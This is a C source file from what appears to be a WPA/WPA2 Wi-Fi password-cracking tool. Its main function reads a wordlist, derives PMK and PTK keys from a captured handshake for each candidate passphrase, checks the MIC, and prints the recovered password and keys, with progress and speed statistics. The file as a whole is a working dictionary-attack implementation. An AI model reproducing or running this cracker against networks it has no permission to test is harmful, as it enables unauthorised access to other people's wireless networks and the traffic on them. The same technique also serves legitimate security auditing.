#include "cracker.h"
#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/time.h>

void cracker_config_init(struct cracker_config *config) {
    memset(config, 0, sizeof(*config));
    config->max_passwords = 0;  // Unlimited
    config->show_tries = 1;     // Show each attempt by default
}

void cracker_config_set_wordlist(struct cracker_config *config, const char *path) {
    strncpy(config->wordlist, path, sizeof(config->wordlist) - 1);
}

void cracker_config_set_ssid(struct cracker_config *config, const char *ssid) {
    strncpy(config->ssid, ssid, sizeof(config->ssid) - 1);
}

// Get current time in seconds (with microsecond precision)
static double get_time_seconds(void) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return tv.tv_sec + tv.tv_usec / 1000000.0;
}

// Strip trailing whitespace and newline
static void strip_whitespace(char *str) {
    int len = strlen(str);
    while (len > 0 && (str[len - 1] == '\n' || str[len - 1] == '\r' ||
                       str[len - 1] == ' ' || str[len - 1] == '\t')) {
        str[--len] = '\0';
    }
}

int cracker_attack(struct wpa_handshake *handshake,
                   struct cracker_config *config,
                   struct cracker_stats *stats) {
    FILE *fp;
    char line[256];
    uint8_t pmk[WPA_PMK_LEN];
    uint8_t ptk[WPA_PTK_LEN];
    int password_num = 0;
    double start_time, current_time;

    // Validate handshake
    if (!handshake || !handshake->complete) {
        log_error("Handshake is incomplete");
        return -1;
    }

    // Validate config
    if (strlen(config->wordlist) == 0) {
        log_error("No wordlist specified");
        return -1;
    }

    // Open wordlist
    fp = fopen(config->wordlist, "r");
    if (!fp) {
        log_error("Failed to open wordlist: %s", config->wordlist);
        return -1;
    }

    // Print attack info
    printf("\n╔══════════════════════════════════════════════╗\n");
    printf("║           Dictionary Attack Started          ║\n");
    printf("╚══════════════════════════════════════════════╝\n\n");

    char ap_str[18], client_str[18];
    mac_to_str(handshake->ap_mac, ap_str);
    mac_to_str(handshake->client_mac, client_str);

    log_info("Target AP:     %s", ap_str);
    log_info("Target Client: %s", client_str);
    log_info("SSID:          %s", strlen(handshake->ssid) > 0 ? handshake->ssid : "(unknown)");
    log_info("Wordlist:      %s", config->wordlist);
    printf("\n");

    // Initialize statistics
    memset(stats, 0, sizeof(*stats));
    start_time = get_time_seconds();

    // Try each password
    while (fgets(line, sizeof(line), fp)) {
        strip_whitespace(line);

        // Skip empty lines
        if (strlen(line) == 0) {
            continue;
        }

        password_num++;

        // Check max passwords limit
        if (config->max_passwords > 0 && password_num > config->max_passwords) {
            log_warning("Reached maximum password limit (%d)", config->max_passwords);
            break;
        }

        // Derive PMK from passphrase and SSID
        if (crypto_derive_pmk(line, handshake->ssid, strlen(handshake->ssid), pmk) < 0) {
            log_error("Failed to derive PMK for password: %s", line);
            continue;
        }

        // Derive PTK from PMK and handshake data
        if (crypto_derive_ptk(pmk,
                              handshake->ap_mac,
                              handshake->client_mac,
                              handshake->anonce,
                              handshake->snonce,
                              ptk) < 0) {
            log_error("Failed to derive PTK");
            continue;
        }

        // Verify MIC
        int mic_result = crypto_verify_mic(ptk,
                                           handshake->eapol_frame,
                                           handshake->eapol_len,
                                           handshake->mic);

        if (mic_result < 0) {
            log_error("Failed to verify MIC");
            continue;
        }

        // Print progress
        if (config->show_tries) {
            printf("\r  Trying password %d: %-30s", password_num, line);
            fflush(stdout);
        }

        // Check if password found
        if (mic_result == 1) {
            current_time = get_time_seconds();

            // Update statistics
            stats->total_tried = password_num;
            stats->found = 1;
            strncpy(stats->found_password, line, sizeof(stats->found_password) - 1);
            stats->elapsed_seconds = current_time - start_time;

            printf("\n\n");
            log_success("PASSWORD FOUND!");
            printf("\n");
            log_success("Password: %s", line);
            log_success("Tried %d passwords in %.2f seconds", password_num, stats->elapsed_seconds);
            printf("\n");

            // Print key info
            crypto_print_pmk(pmk);
            crypto_print_ptk(ptk);

            fclose(fp);
            return 0;  // Success
        }

        // Update statistics periodically
        if (password_num % 1000 == 0) {
            current_time = get_time_seconds();
            stats->total_tried = password_num;
            stats->elapsed_seconds = current_time - start_time;

            if (config->show_tries) {
                double speed = password_num / stats->elapsed_seconds;
                printf("\r  Tried %d passwords (%.0f passwords/sec) - Current: %-30s",
                       password_num, speed, line);
                fflush(stdout);
            }
        }
    }

    // Password not found
    current_time = get_time_seconds();
    stats->total_tried = password_num;
    stats->found = 0;
    stats->elapsed_seconds = current_time - start_time;

    printf("\n\n");
    log_warning("Password not found in wordlist");
    log_info("Tried %d passwords in %.2f seconds", password_num, stats->elapsed_seconds);
    printf("\n");

    fclose(fp);
    return 1;  // Not found
}

void cracker_print_stats(struct cracker_stats *stats) {
    printf("\n╔══════════════════════════════════════════════╗\n");
    printf("║           Attack Statistics                  ║\n");
    printf("╠══════════════════════════════════════════════╣\n");
    printf("║  Passwords tried:  %-24d ║\n", stats->total_tried);
    printf("║  Time elapsed:     %-24.2f ║\n", stats->elapsed_seconds);

    if (stats->elapsed_seconds > 0) {
        double speed = stats->total_tried / stats->elapsed_seconds;
        printf("║  Speed:            %-21.0f p/s ║\n", speed);
    }

    if (stats->found) {
        printf("║  Status:           FOUND                    ║\n");
        printf("║  Password:         %-24s ║\n", stats->found_password);
    } else {
        printf("║  Status:           NOT FOUND                ║\n");
    }

    printf("╚══════════════════════════════════════════════╝\n\n");
}
